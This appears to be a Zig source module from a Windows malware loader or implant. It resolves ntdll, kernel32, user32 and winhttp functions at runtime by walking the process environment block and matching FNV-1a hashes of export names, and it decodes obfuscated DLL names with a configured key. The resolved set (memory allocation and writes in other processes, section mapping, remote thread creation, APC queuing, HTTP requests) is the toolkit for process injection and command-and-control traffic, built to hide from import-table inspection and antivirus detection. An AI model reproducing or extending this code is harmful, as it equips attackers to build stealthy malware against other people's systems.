const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const hashFNV1a = @import("helper/hash.zig").hashFNV1a;
const deobfsBytes = @import("helper/obfs.zig").deobfsBytes;
const cStringToSlice = @import("helper/string.zig").cStringToSlice;
const win32 = @import("win32.zig");

// ntdll.dll
pub const fnNtAllocateVirtualMemory = fn (ProcessHandle: windows.HANDLE, BaseAddress: *windows.PVOID, ZeroBits: windows.ULONG_PTR, RegionSize: *windows.SIZE_T, AllocationType: windows.ULONG, PageProtection: windows.ULONG) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtClose = fn (Handle: windows.HANDLE) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtCreateSection = fn (SectionHandle: *windows.HANDLE, DesiredAccess: windows.ACCESS_MASK, ObjectAttributes: ?*win32.OBJECT_ATTRIBUTES, MaximumSize: ?*windows.LARGE_INTEGER, SectionPageProtection: windows.ULONG, AllocationAttributes: windows.ULONG, FileHandle: ?windows.HANDLE) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtCreateThreadEx = fn (ThreadHandle: *windows.HANDLE, DesiredAccess: windows.ACCESS_MASK, ObjectAttributes: ?*win32.OBJECT_ATTRIBUTES, ProcessHandle: windows.HANDLE, StartRoutine: *win32.USER_THREAD_START_ROUTINE, Argument: ?windows.PVOID, CreateFlags: windows.ULONG, ZeroBits: windows.SIZE_T, StackSize: windows.SIZE_T, MaximumStackSize: windows.SIZE_T, AttributeList: *win32.PS_ATTRIBUTE_LIST) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtDelayExecution = fn (Alertable: windows.BOOLEAN, DelayInterval: *windows.LARGE_INTEGER) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtFreeVirtualMemory = fn (ProcessHandle: windows.HANDLE, BaseAddress: *windows.PVOID, RegionSize: *windows.SIZE_T, FreeType: windows.ULONG) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtMapViewOfSection = fn (SectionHandle: windows.HANDLE, ProcessHandle: windows.HANDLE, BaseAddress: *windows.PVOID, ZeroBits: windows.ULONG_PTR, CommitSize: windows.SIZE_T, SectionOffset: ?*windows.LARGE_INTEGER, ViewSize: *windows.SIZE_T, InheritDisposition: windows.SECTION_INHERIT, AllocationType: windows.ULONG, PageProtection: windows.ULONG) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtOpenKey = fn (KeyHandle: *windows.HANDLE, DesiredAccess: windows.ACCESS_MASK, ObjectAttributes: *win32.OBJECT_ATTRIBUTES) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtOpenProcess = fn (ProcessHandle: *windows.HANDLE, DesiredAccess: windows.ACCESS_MASK, ObjectAttributes: *win32.OBJECT_ATTRIBUTES, ClientId: ?*windows.CLIENT_ID) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtOpenProcessToken = fn (ProcessHandle: windows.HANDLE, DesiredAccess: windows.ACCESS_MASK, TokenHandle: *windows.HANDLE) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtProtectVirtualMemory = fn (ProcessHandle: windows.HANDLE, BaseAddress: *windows.PVOID, RegionSize: *windows.SIZE_T, NewProtection: windows.ULONG, OldProtection: *windows.ULONG) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtQueryInformationProcess = fn (ProcessHandle: windows.HANDLE, ProcessInformationClass: windows.PROCESSINFOCLASS, ProcessInformation: windows.PVOID, ProcessInformationLength: windows.ULONG, ReturnLength: ?*windows.ULONG) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtQueryInformationToken = fn (TokenHandle: windows.HANDLE, TokenInformationClass: win32.TOKEN_INFORMATION_CLASS, TokenInformation: windows.PVOID, TokenInformationLength: windows.ULONG, ReturnLength: *windows.ULONG) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtQuerySystemInformation = fn (SystemInformationClass: windows.SYSTEM_INFORMATION_CLASS, SystemInformation: windows.PVOID, SystemInformationLength: windows.ULONG, ReturnLength: ?*windows.ULONG) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtQueryValueKey = fn (KeyHandle: windows.HANDLE, ValueName: *windows.UNICODE_STRING, KeyValueInformationClass: win32.KEY_VALUE_INFORMATION_CLASS, KeyValueInformation: ?windows.PVOID, Length: windows.ULONG, ResultLength: *windows.ULONG) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtQueueApcThread = fn (ThreadHandle: windows.HANDLE, ApcRoutine: *win32.PS_APC_ROUTINE, ApcArgument1: windows.PVOID, ApcArgument2: windows.PVOID, ApcArgument3: windows.PVOID) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtReadVirtualMemory = fn (ProcessHandle: windows.HANDLE, BaseAddress: ?windows.PVOID, Buffer: windows.PVOID, NumberOfBytesToRead: windows.SIZE_T, NumberOfBytesRead: ?*windows.SIZE_T) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtResumeThread = fn (ThreadHandle: windows.HANDLE, PreviousSuspendCount: ?*windows.ULONG) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtTerminateProcess = fn (ProcessHandle: ?windows.HANDLE, ExitStatus: windows.NTSTATUS) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtUnmapViewOfSection = fn (ProcessHandle: windows.HANDLE, BaseAddress: ?windows.PVOID) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtWaitForSingleObject = fn (Handle: windows.HANDLE, Alertable: windows.BOOLEAN, Timeout: ?*windows.LARGE_INTEGER) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnNtWriteVirtualMemory = fn (ProcessHandle: windows.HANDLE, BaseAddress: ?windows.PVOID, Buffer: windows.PVOID, NumberOfBytesToWrite: windows.SIZE_T, NumberOfBytesWritten: ?*windows.SIZE_T) callconv(windows.WINAPI) windows.NTSTATUS;
pub const fnRtlInitUnicodeString = fn (DestinationString: *windows.UNICODE_STRING, SourceString: windows.PCWSTR) callconv(windows.WINAPI) void;
pub const fnRtlQueryDepthSList = fn (ListHead: *win32.SLIST_HEADER) callconv(windows.WINAPI) windows.USHORT;
pub const fnRtlQueryEnvironmentVariable_U = fn (Environment: ?windows.PVOID, Name: *windows.UNICODE_STRING, Value: *windows.UNICODE_STRING) callconv(windows.WINAPI) windows.NTSTATUS;
// kernel32.dll
pub const fnCreateProcessA = fn (lpApplicationName: ?windows.LPCSTR, lpCommandLine: ?windows.LPSTR, lpProcessAttributes: ?*windows.SECURITY_ATTRIBUTES, lpThreadAttributes: ?*windows.SECURITY_ATTRIBUTES, bInheritHandles: windows.BOOL, dwCreationFlags: windows.DWORD, lpEnvironment: ?windows.LPVOID, lpCurrentDirectory: ?*windows.LPCSTR, lpStartupInfo: *win32.STARTUPINFOA, lpProcessInformation: *windows.PROCESS_INFORMATION) callconv(windows.WINAPI) windows.BOOL;
pub const fnGetLastError = fn () callconv(windows.WINAPI) windows.BOOL;
// pub const fnGetModuleHandleA = fn (lpModuleName: windows.LPCSTR) callconv(windows.WINAPI) windows.HMODULE;
// pub const fnGetProcAddress = fn (hModule: windows.HMODULE, lpProcName: windows.LPCSTR) callconv(windows.WINAPI) windows.FARPROC;
pub const fnLoadLibraryA = fn (lpLibFileName: windows.LPCSTR) callconv(windows.WINAPI) ?windows.HMODULE;
pub const fnWinExec = fn (lpCmdLine: [*c]u8, UINT: windows.UINT) callconv(windows.WINAPI) windows.UINT;
// user32.dll
pub const fnEnumChildWindows = fn (hWndParent: ?windows.HWND, lpEnumFunc: win32.WNDENUMPROC, lParam: windows.LPARAM) callconv(windows.WINAPI) windows.BOOL;
// winhttp.dll
pub const fnWinHttpCloseHandle = fn (hInternet: win32.HINTERNET) callconv(.C) windows.BOOL;
pub const fnWinHttpConnect = fn (hSession: win32.HINTERNET, pswzServerName: windows.LPCWSTR, nServerPort: win32.INTERNET_PORT, dwReserved: windows.DWORD) callconv(.C) win32.HINTERNET;
pub const fnWinHttpOpen = fn (pszAgentW: ?windows.LPCWSTR, dwAccessType: windows.DWORD, pszProxyW: ?windows.LPCWSTR, pszProxyBypassW: ?windows.LPCWSTR, dwFlags: windows.DWORD) callconv(.C) win32.HINTERNET;
pub const fnWinHttpOpenRequest = fn (hConnect: win32.HINTERNET, pwszVerb: ?windows.LPCWSTR, pwszObjectName: ?windows.LPCWSTR, pwszVersion: ?windows.LPCWSTR, pwszReferrer: ?windows.LPCWSTR, ppwszAcceptTypes: ?*windows.LPCWSTR, dwFlags: windows.DWORD) callconv(.C) win32.HINTERNET;
pub const fnWinHttpQueryDataAvailable = fn (hRequest: win32.HINTERNET, lpdwNumberOfBytesAvailable: *windows.DWORD) callconv(.C) windows.BOOL;
pub const fnWinHttpReadData = fn (hRequest: win32.HINTERNET, lpBuffer: windows.LPVOID, dwNumberOfBytesToRead: windows.DWORD, lpdwNumberOfBytesRead: *windows.DWORD) callconv(.C) windows.BOOL;
pub const fnWinHttpReceiveResponse = fn (hRequest: win32.HINTERNET, lpReserved: ?windows.LPVOID) callconv(.C) windows.BOOL;
pub const fnWinHttpSendRequest = fn (hRequest: win32.HINTERNET, lpszHeaders: ?windows.LPCWSTR, dwHeadersLength: windows.DWORD, lpOptional: ?windows.LPVOID, dwOptionalLength: windows.DWORD, dwTotalLength: windows.DWORD, dwContext: windows.DWORD_PTR) callconv(.C) windows.BOOL;

pub const Apis = struct {
    // ntdll.dll
    NtAllocateVirtualMemory: ?*const fnNtAllocateVirtualMemory = null,
    NtClose: ?*const fnNtClose = null,
    NtCreateSection: ?*const fnNtCreateSection = null,
    NtCreateThreadEx: ?*const fnNtCreateThreadEx = null,
    NtDelayExecution: ?*const fnNtDelayExecution = null,
    NtFreeVirtualMemory: ?*const fnNtFreeVirtualMemory = null,
    NtMapViewOfSection: ?*const fnNtMapViewOfSection = null,
    NtOpenKey: ?*const fnNtOpenKey = null,
    NtOpenProcess: ?*const fnNtOpenProcess = null,
    NtOpenProcessToken: ?*const fnNtOpenProcessToken = null,
    NtProtectVirtualMemory: ?*const fnNtProtectVirtualMemory = null,
    NtQueryInformationProcess: ?*const fnNtQueryInformationProcess = null,
    NtQueryInformationToken: ?*const fnNtQueryInformationToken = null,
    NtQuerySystemInformation: ?*const fnNtQuerySystemInformation = null,
    NtQueryValueKey: ?*const fnNtQueryValueKey = null,
    NtQueueApcThread: ?*const fnNtQueueApcThread = null,
    NtReadVirtualMemory: ?*const fnNtReadVirtualMemory = null,
    NtResumeThread: ?*const fnNtResumeThread = null,
    NtTerminateProcess: ?*const fnNtTerminateProcess = null,
    NtUnmapViewOfSection: ?*const fnNtUnmapViewOfSection = null,
    NtWaitForSingleObject: ?*const fnNtWaitForSingleObject = null,
    NtWriteVirtualMemory: ?*const fnNtWriteVirtualMemory = null,
    RtlInitUnicodeString: ?*const fnRtlInitUnicodeString = null,
    RtlQueryDepthSList: ?*const fnRtlQueryDepthSList = null,
    RtlQueryEnvironmentVariable_U: ?*const fnRtlQueryEnvironmentVariable_U = null,
    // kernel32.dll
    CreateProcessA: ?*const fnCreateProcessA = null,
    GetLastError: ?*const fnGetLastError = null,
    // GetModuleHandleA: ?*const fnGetModuleHandleA = null,
    // GetProcAddress: ?*const fnGetProcAddress = null,
    LoadLibraryA: ?*const fnLoadLibraryA = null,
    WinExec: ?*const fnWinExec = null,
    // user32.dll
    EnumChildWindows: ?*const fnEnumChildWindows = null,
    // winhttp.dll
    WinHttpCloseHandle: ?*const fnWinHttpCloseHandle = null,
    WinHttpConnect: ?*const fnWinHttpConnect = null,
    WinHttpOpen: ?*const fnWinHttpOpen = null,
    WinHttpOpenRequest: ?*const fnWinHttpOpenRequest = null,
    WinHttpQueryDataAvailable: ?*const fnWinHttpQueryDataAvailable = null,
    WinHttpReadData: ?*const fnWinHttpReadData = null,
    WinHttpReceiveResponse: ?*const fnWinHttpReceiveResponse = null,
    WinHttpSendRequest: ?*const fnWinHttpSendRequest = null,

    const Self = @This();

    pub fn get(self: *Self) bool {
        const peb = win32.getPEB();
        const ldr = peb.Ldr;
        var dte: *win32.LDR_DATA_TABLE_ENTRY = @ptrCast(ldr.InLoadOrderModuleList.Flink);

        const str_user32_dll = deobfsBytes(config.str_user32_dll_obfs.len, config.str_user32_dll_obfs, config.obfs_key)[0..];
        const str_winhttp_dll = deobfsBytes(config.str_winhttp_dll_obfs.len, config.str_winhttp_dll_obfs, config.obfs_key)[0..];
        var other_modules_loaded: bool = false;

        while (dte.DllBase != null) : (dte = @ptrCast(dte.InLoadOrderLinks.Flink)) {
            self.find(dte.DllBase.?);
            if (self.ok()) {
                return true;
            }

            // Forcefully load other modules for stability
            if (self.LoadLibraryA != null and !other_modules_loaded) {
                _ = self.LoadLibraryA.?(@ptrCast(str_user32_dll));
                _ = self.LoadLibraryA.?(@ptrCast(str_winhttp_dll));
                other_modules_loaded = true;
            }
        }

        return false;
    }

    fn find(self: *Self, inst: windows.PVOID) void {
        const dos: *win32.IMAGE_DOS_HEADER = @ptrCast(@alignCast(inst));
        const nt = win32.rva2va(*win32.IMAGE_NT_HEADERS, inst, @as(u32, @bitCast(dos.e_lfanew)));
        const rva = nt.OptionalHeader.DataDirectory[win32.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (rva == 0) return;
        const exp = win32.rva2va(*win32.IMAGE_EXPORT_DIRECTORY, inst, rva);
        const cnt = exp.NumberOfNames;
        if (cnt == 0) return;
        const adr = win32.rva2va([*c]u32, inst, exp.AddressOfFunctions);
        const sym = win32.rva2va([*c]u32, inst, exp.AddressOfNames);
        const ord = win32.rva2va([*c]u16, inst, exp.AddressOfNameOrdinals);
        // const dll = cStringToSlice(win32.rva2va([*c]u8, inst, exp.Name));

        for (0..cnt) |i| {
            const sym_ = win32.rva2va([*c]u8, inst, sym[i]);
            const adr_ = win32.rva2va(usize, inst, adr[ord[i]]);
            const hash = hashFNV1a(cStringToSlice(sym_));

            // Find each API
            inline for (@typeInfo(Apis).@"struct".fields) |field| {
                @setEvalBranchQuota(10000);            
                if (hash == comptime hashFNV1a(field.name)) {
                    if (@field(self, field.name) == null) {
                        @field(self, field.name) = @ptrFromInt(adr_);
                        // std.debug.print("[+] {s} OK\n", .{ field.name });
                    }
                }
            }
        }
    }

    fn ok(self: *Self) bool {
        inline for (@typeInfo(Apis).@"struct".fields) |field| {
            if (@field(self, field.name) == null) {
                // std.debug.print("[x] {s} is null\n", .{ field.name });
                return false;
            }
        }
        return true;
    }
};
